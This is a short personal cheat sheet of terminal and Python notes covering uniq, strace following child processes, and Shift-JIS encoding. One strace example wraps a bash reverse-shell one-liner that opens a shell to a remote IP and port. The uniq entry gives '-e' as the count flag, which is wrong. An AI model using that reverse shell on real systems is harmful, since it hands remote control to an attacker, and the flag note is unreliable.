...
*** uniq
    + ~uniq -e~ //count the number of occurrences
...
*** TODO linux syscalls
    + ~strace -f~ //follow child processes created, syscall: fork
      - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~
...
*** encoding and decoding in python
   + ~str("こ").encode("utf-8").decode("utf-8")~
   + ~str("こ").encode("shift-jis").decode("shift-jis")~
   + //Shift-JIS encoded string, in unsigned ints: ~130 177 130 241 130 201 130 191 130 205~ //こんにちは
   + ~chr(99)~ //'c'
